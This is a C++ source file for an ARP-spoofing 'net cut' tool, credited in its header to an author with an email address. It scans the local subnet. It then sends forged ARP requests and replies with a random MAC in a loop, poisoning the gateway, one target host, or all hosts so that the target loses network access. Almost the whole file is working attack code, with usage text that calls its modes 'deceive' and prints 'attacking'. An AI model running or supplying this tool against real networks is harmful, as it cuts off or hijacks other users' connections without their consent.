/*
 *
 * net cut by ivan
 *
 * email: float0001@gmail.com
 *
 * 2016-12-19 14:58:32
 *
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <string>
#include <vector>
#include <thread>
#include <map>
#include "get_interface.h"
#include "arp.h"

#define FORMLINE "%-3s%-10s%-16s%-16s%-18s%-16s%-18s%-5s\n"
const char* g_program_name = NULL;
typedef std::vector<interface_item_t> interface_list_t;
typedef std::vector<interface_item_t>::iterator interface_list_iter;
bool run = true;
extern std::map<std::string, host_info> ips;
extern std::map<std::string, host_info>::iterator iter;

void signal_callback_handler(int signum) {
    run = false;
}

static void get_ifs() {
    interface_list_t ifs;
    char stat_str[10];
    char buf[10];
    int i;
    get_interface_list(ifs);
    fprintf(stdout, "network interface list: [%zd]\n", ifs.size());
    fprintf(stdout, FORMLINE, "Id", "Name", "Ip", "Netmask",
            "Mac", "Gateway Ip", "Gateway Mac", "Status");
    interface_list_iter iter;
    for (i = 1, iter = ifs.begin(); iter != ifs.end();
            iter++, i++) {
        if ((*iter).status == 1) {
            snprintf(stat_str, sizeof(stat_str), "up");
        } else if ((*iter).status == 0) {
            snprintf(stat_str, sizeof(stat_str), "down");
        } else {
            snprintf(stat_str, sizeof(stat_str), "-");
        }
        snprintf(buf, sizeof buf, "%d", i);
        fprintf(stdout, FORMLINE, buf,
            (*iter).name.c_str(), (*iter).ip_str.c_str(),
            (*iter).netmask_str.c_str(),
            (*iter).mac_str.c_str(), (*iter).gw_ip_str.c_str(),
            (*iter).gw_mac_str.c_str(), stat_str);
    }
}
static void usage() {
    fprintf(stdout, "Usage: %s [OPTIONS...]\n", g_program_name);
    fprintf(stdout, "  OPTIONS\n");
    fprintf(stdout, "    -li            : get network interfaces info\n");
    fprintf(stdout, "    -t             : cut type:\n"
                    "                        "
                    "0 - deceive the gateway (default)\n"
                    "                        "
                    "1 - deceive the host\n"
                    "                        "
                    "2 - deceive all hosts\n");
    fprintf(stdout, "    -i             : interface's name eg. eth0\n");
    fprintf(stdout, "    -scan          : scan inner host\n");
    fprintf(stdout, "    [-gwip ip]     : specify gateway ip\n");
    fprintf(stdout, "    [-gwmac mac]   : specify gateway mac\n");
    fprintf(stdout, "    [-fgmac mac]   : specify forged mac\n");
    fprintf(stdout, "    -target ip     : target ip\n");
    fprintf(stdout, "    -h             : help\n");
    fprintf(stdout, "\nBest wishes!! Contact float0001@gmail.com.\n");
    exit(0);

}
static void scan_host(const char* ifname) {
    uint32_t start_ip, end_ip;
    struct in_addr start, end;
    char start_s[32], end_s[32];
    int host_cnt = 0;
    arp_cheat_addr_t arp_pkt;
    interface_item_t info;
    info.name = "-";
    info.ip = 0;
    info.ip_str = "-";
    info.netmask_str = "-";
    info.mac_str = "-";
    info.gw_ip_str = "-";
    info.gw_mac_str = "-";
    if (0 != get_if_info(ifname, info)) {
        fprintf(stderr, "get interface info error\n");
        return ;
    }
    if ((info.ip & 0x7F000000) == 0x7F000000) {  // 排除lo网卡
        printf("ignore interface [%s]\n", ifname);
        return ;
    }
    printf("self ip:%s mask:%s mac:%s\n", info.ip_str.c_str(),
            info.netmask_str.c_str(), info.mac_str.c_str());

    host_cnt = (info.netmask ^ 0xFFFFFFFF) - 1;
    start_ip = (info.ip & info.netmask) + 1;
    end_ip = start_ip + host_cnt - 1;
    start.s_addr = htonl(start_ip);
    end.s_addr = htonl(end_ip);
    snprintf(start_s, sizeof(start_s), "%s", inet_ntoa(start));
    snprintf(end_s, sizeof(end_s), "%s", inet_ntoa(end));
    printf("scan ip: %s - %s\n", start_s, end_s);
    printf("total: %d\n", host_cnt);

    std::thread recv(on_recv_arp_func);
    arp_pkt.op = 1;
    arp_pkt.if_name = ifname;
    memcpy(arp_pkt.eth_src_mac, info.mac, ETH_ALEN);
    memset(arp_pkt.eth_dst_mac, 0xff, ETH_ALEN);
    memcpy(arp_pkt.arp_snd_mac, info.mac, ETH_ALEN);
    bzero(arp_pkt.arp_tgt_mac, ETH_ALEN);
    arp_pkt.arp_snd_ip = info.ip_str.c_str();
    for (int i = 0; i < host_cnt && run; i++) {
        start.s_addr = htonl(start_ip + i);
        snprintf(start_s, sizeof(start_s), "%s", inet_ntoa(start));
        arp_pkt.arp_tgt_ip = start_s;
        send_arp_packet(&arp_pkt);
        usleep(1000);
    }
    while (run) {
        sleep(1);
    }

    if (recv.joinable()) {
        recv.join();
    }
}
static int show_if(const char* ifname, interface_item_t& if_info) {
    if_info.name = "";
    if_info.ip = 0;
    if_info.ip_str = "";
    if_info.netmask_str = "";
    if_info.mac_str = "";
    if_info.gw_ip_str = "";
    if_info.gw_mac_str = "";
    if (get_if_info(ifname, if_info) != 0) {
        fprintf(stderr, "get interface info error!\n");
        return -1;
    }
    char stat_str[10];
    fprintf(stdout, FORMLINE, "Id", "Name", "Ip", "Netmask",
            "Mac", "Gateway Ip", "Gateway Mac", "Status");
    if (if_info.status == 1) {
        snprintf(stat_str, sizeof(stat_str), "up");
    } else if (if_info.status == 0) {
        snprintf(stat_str, sizeof(stat_str), "down");
    } else {
        snprintf(stat_str, sizeof(stat_str), "-");
    }
    fprintf(stdout, FORMLINE, "1", ifname, if_info.ip_str.c_str(),
        if_info.netmask_str.c_str(), if_info.mac_str.c_str(),
        if_info.gw_ip_str.c_str(), if_info.gw_mac_str.c_str(), stat_str);
    return 0;
}
int main(int argc, const char *argv[]) {
    char *p = (char *)memrchr((const void *)argv[0], (int)'/', strlen(argv[0]));
    g_program_name = p == NULL ? argv[0] : (p + 1);
    const char* ifname = NULL;
    bool is_scan = false;
    const char* target_ip = NULL;
    const char* gw_ip = NULL;
    uint8_t gw_mac[ETH_ALEN] = {0};
    bool has_gw_mac = false;
    uint8_t forged_mac[ETH_ALEN] = {0};
    bool has_fg_mac = false;
    int att_type = 0;

    for (int i = 1; i < argc; ++i) {
        if (strncasecmp(argv[i], "-li", 3) == 0) {
            get_ifs();
            return 0;
        } else if (strncasecmp(argv[i], "-target", 7) == 0) {
            i++;
            if (i < argc) {
                if (0 != check_ip(argv[i])) {
                    fprintf(stderr, "target ip invalid!\n");
                    return -1;
                }
                target_ip = argv[i];
            } else {
                fprintf(stderr, "-target need ip address.\n");
                return -1;
            }
        } else if (strncasecmp(argv[i], "-gwip", 5) == 0) {
            i++;
            if (i < argc) {
                if (0 != check_ip(argv[i])) {
                    fprintf(stderr, "gateway ip invalid!\n");
                    return -1;
                }
                gw_ip = argv[i];
            } else {
                fprintf(stderr, "-gwip need ip address.\n");
                return -1;
            }
        }  else if (strncasecmp(argv[i], "-gwmac", 6) == 0) {
            i++;
            if (i < argc) {
                if (NULL == get_mac_addr(argv[i], gw_mac, sizeof(gw_mac))) {
                    fprintf(stderr, "gateway mac invalid!\n");
                    return -1;
                }
                has_gw_mac = true;
            } else {
                fprintf(stderr, "-gwmac need mac address.\n");
                return -1;
            }
        } else if (strncasecmp(argv[i], "-fgmac", 6) == 0) {
            i++;
            if (i < argc) {
                if (NULL == get_mac_addr(argv[i], forged_mac,
                            sizeof(forged_mac))) {
                    fprintf(stderr, "forged mac invalid!\n");
                    return -1;
                }
                has_fg_mac = true;
            } else {
                fprintf(stderr, "-fgmac need mac address.\n");
                return -1;
            }
        } else if (strncasecmp(argv[i], "-t", 2) == 0) {
            i++;
            if (i < argc) {
                att_type = atoi(argv[i]);
            } else {
                fprintf(stderr, "-t need .attack type\n");
                return -1;
            }
        } else if (strncasecmp(argv[i], "-i", 2) == 0) {
            i++;
            if (i < argc) {
                ifname = argv[i];
            } else {
                fprintf(stderr, "-i need interface's name.\n");
                return -1;
            }
        } else if (strncasecmp(argv[i], "-scan", 5) == 0) {
            is_scan = true;
        } else if (strncasecmp(argv[i], "-h", 2) == 0) {
            usage();
        } else {}
    }
    signal(SIGINT, signal_callback_handler);
    signal(SIGUSR1, signal_callback_handler);
    signal(SIGTERM, signal_callback_handler);
    if (ifname == NULL) {
         fprintf(stderr, "Please specify interface!!\n");
         usage();
    }
    if (is_scan) {
        scan_host(ifname);
        return 0;
    }
    if (target_ip == NULL) {
        fprintf(stderr, "Please specify target ip!!\n");
        usage();
    }

    interface_item_t if_info;
    if (show_if(ifname, if_info) != 0) {
        return -1;
    }
    arp_cheat_addr_t req_arpbuf;
    arp_cheat_addr_t rsp_arpbuf;
    req_arpbuf.if_name = ifname;
    rsp_arpbuf.if_name = ifname;
    if (gw_ip == NULL && if_info.gw_ip_str.size() <= 0) {
        fprintf(stderr, "We need gateway ip!\n");
        return -1;
    }
    uint8_t ip_mac_addr[ETH_ALEN];
    std::string mac_str = get_ip_mac(ifname, if_info.ip_str.c_str(),
               if_info.mac_str.c_str(), target_ip, ip_mac_addr, ETH_ALEN);
    if (mac_str == "") {
        fprintf(stderr, "Get ip(%s) mac error!\n", target_ip);
        return -1;
    }
    fprintf(stdout, "mode: specify host\ntarget ip:%s\ntarget mac:%s\n",
            target_ip, mac_str.c_str());
    fflush(stdout);
    std::string rand_mac = get_rand_mac();
    fprintf(stdout, "======>attacking");
    if (att_type == 0) {
        if (!has_gw_mac && if_info.gw_mac_str.size() <= 0) {
            fprintf(stderr, "We need gateway mac!\n");
            return -1;
        }
        while (run) {
            //uint8_t broad[ETH_ALEN] = BROADCAST_ADDR;
            //memcpy(req_arpbuf.eth_dst_mac, broad, ETH_ALEN);
            //bzero(req_arpbuf.arp_tgt_mac, ETH_ALEN);
//
            req_arpbuf.op = 1;
            if (has_gw_mac) {
                memcpy(rsp_arpbuf.eth_dst_mac, gw_mac, ETH_ALEN);
                memcpy(rsp_arpbuf.arp_tgt_mac, gw_mac, ETH_ALEN);
            } else {
                memcpy(rsp_arpbuf.eth_dst_mac, if_info.gw_mac, ETH_ALEN);
                memcpy(rsp_arpbuf.arp_tgt_mac, if_info.gw_mac, ETH_ALEN);
            }
//
            req_arpbuf.arp_snd_ip = target_ip;
            req_arpbuf.arp_tgt_ip = gw_ip ? gw_ip : if_info.gw_ip_str.c_str();
            //memcpy(req_arpbuf.eth_src_mac, ip_mac_addr, ETH_ALEN);
            get_mac_addr(rand_mac.c_str(), req_arpbuf.eth_src_mac,
                    ETH_ALEN);
            memcpy(req_arpbuf.arp_snd_mac, req_arpbuf.eth_src_mac, ETH_ALEN);
            send_arp_packet(&req_arpbuf);
#if 1
            rsp_arpbuf.op = 2;
            if (has_gw_mac) {
                memcpy(rsp_arpbuf.eth_dst_mac, gw_mac, ETH_ALEN);
                memcpy(rsp_arpbuf.arp_tgt_mac, gw_mac, ETH_ALEN);
            } else {
                memcpy(rsp_arpbuf.eth_dst_mac, if_info.gw_mac, ETH_ALEN);
                memcpy(rsp_arpbuf.arp_tgt_mac, if_info.gw_mac, ETH_ALEN);
            }
            rsp_arpbuf.arp_snd_ip = target_ip;
            rsp_arpbuf.arp_tgt_ip = gw_ip ? gw_ip : if_info.gw_ip_str.c_str();
            //memcpy(rsp_arpbuf.eth_src_mac, ip_mac_addr, ETH_ALEN);
            get_mac_addr(rand_mac.c_str(), rsp_arpbuf.eth_src_mac,
                    ETH_ALEN);
            memcpy(rsp_arpbuf.arp_snd_mac, rsp_arpbuf.eth_src_mac, ETH_ALEN);
            send_arp_packet(&rsp_arpbuf);
#endif
            usleep(500000);
            fprintf(stdout, ".");
            fflush(stdout);
        }
        fprintf(stdout, "\n");
    } else if (att_type == 1) {
        while (run) {
            // send request packet
            //uint8_t broad[ETH_ALEN] = BROADCAST_ADDR;
            //memcpy(req_arpbuf.eth_dst_mac, broad, ETH_ALEN);
            //bzero(req_arpbuf.arp_tgt_mac, ETH_ALEN);
            req_arpbuf.op = 1;
//
            memcpy(req_arpbuf.eth_dst_mac, ip_mac_addr, ETH_ALEN);
            memcpy(rsp_arpbuf.arp_tgt_mac, rsp_arpbuf.eth_dst_mac, ETH_ALEN);
//
            req_arpbuf.arp_snd_ip = gw_ip ? gw_ip : if_info.gw_ip_str.c_str();
            req_arpbuf.arp_tgt_ip = target_ip;
            if (has_gw_mac) {
                memcpy(rsp_arpbuf.eth_src_mac, gw_mac, ETH_ALEN);
                memcpy(rsp_arpbuf.arp_snd_mac, gw_mac, ETH_ALEN);
            } else {
                get_mac_addr(rand_mac.c_str(), req_arpbuf.eth_src_mac,
                        ETH_ALEN);
                memcpy(req_arpbuf.arp_snd_mac, req_arpbuf.eth_src_mac, ETH_ALEN);
            }
            send_arp_packet(&req_arpbuf);
            // send response packet
            rsp_arpbuf.op = 2;
            memcpy(rsp_arpbuf.eth_dst_mac, ip_mac_addr, ETH_ALEN);
            memcpy(rsp_arpbuf.arp_tgt_mac, rsp_arpbuf.eth_dst_mac, ETH_ALEN);
            rsp_arpbuf.arp_snd_ip = gw_ip ? gw_ip : if_info.gw_ip_str.c_str();
            rsp_arpbuf.arp_tgt_ip = target_ip;
            if (has_gw_mac) {
                memcpy(rsp_arpbuf.eth_src_mac, gw_mac, ETH_ALEN);
                memcpy(rsp_arpbuf.arp_snd_mac, gw_mac, ETH_ALEN);
            } else {
                get_mac_addr(rand_mac.c_str(), rsp_arpbuf.eth_src_mac,
                        ETH_ALEN);
                memcpy(rsp_arpbuf.arp_snd_mac, rsp_arpbuf.eth_src_mac, ETH_ALEN);
            }
            send_arp_packet(&rsp_arpbuf);
            usleep(500000);
            fprintf(stdout, ".");
            fflush(stdout);
        }
        fprintf(stdout, "\n");
    } else if (att_type == 2) {
        scan_host(ifname);
        while (run) {
            for (iter = ips.begin(); iter != ips.end(); iter++) {
                if (iter->first == target_ip) {
                    continue;
                }
                // send request packet
                //uint8_t broad[ETH_ALEN] = BROADCAST_ADDR;
                //memcpy(req_arpbuf.eth_dst_mac, broad, ETH_ALEN);
                //bzero(req_arpbuf.arp_tgt_mac, ETH_ALEN);
                req_arpbuf.op = 1;
//
                memcpy(req_arpbuf.eth_dst_mac, ip_mac_addr, ETH_ALEN);
                memcpy(rsp_arpbuf.arp_tgt_mac, rsp_arpbuf.eth_dst_mac, ETH_ALEN);
//
                req_arpbuf.arp_snd_ip = gw_ip ? gw_ip : if_info.gw_ip_str.c_str();
                req_arpbuf.arp_tgt_ip = target_ip;
                if (has_gw_mac) {
                    memcpy(rsp_arpbuf.eth_src_mac, gw_mac, ETH_ALEN);
                    memcpy(rsp_arpbuf.arp_snd_mac, gw_mac, ETH_ALEN);
                } else {
                    get_mac_addr(rand_mac.c_str(), req_arpbuf.eth_src_mac,
                            ETH_ALEN);
                    memcpy(req_arpbuf.arp_snd_mac, req_arpbuf.eth_src_mac, ETH_ALEN);
                }
                send_arp_packet(&req_arpbuf);
                // send response packet
                rsp_arpbuf.op = 2;
                memcpy(rsp_arpbuf.eth_dst_mac, ip_mac_addr, ETH_ALEN);
                memcpy(rsp_arpbuf.arp_tgt_mac, rsp_arpbuf.eth_dst_mac, ETH_ALEN);
                rsp_arpbuf.arp_snd_ip = gw_ip ? gw_ip : if_info.gw_ip_str.c_str();
                rsp_arpbuf.arp_tgt_ip = target_ip;
                if (has_gw_mac) {
                    memcpy(rsp_arpbuf.eth_src_mac, gw_mac, ETH_ALEN);
                    memcpy(rsp_arpbuf.arp_snd_mac, gw_mac, ETH_ALEN);
                } else {
                    get_mac_addr(rand_mac.c_str(), rsp_arpbuf.eth_src_mac,
                            ETH_ALEN);
                    memcpy(rsp_arpbuf.arp_snd_mac, rsp_arpbuf.eth_src_mac, ETH_ALEN);
                }
                send_arp_packet(&rsp_arpbuf);
                usleep(500000);
                fprintf(stdout, ".");
                fflush(stdout);
            }
            fprintf(stdout, "\n");

        }
    } else {
        fprintf(stderr, "unknown attack type, [%d]\n", att_type);
        return -1;
    }

    return 0;
}

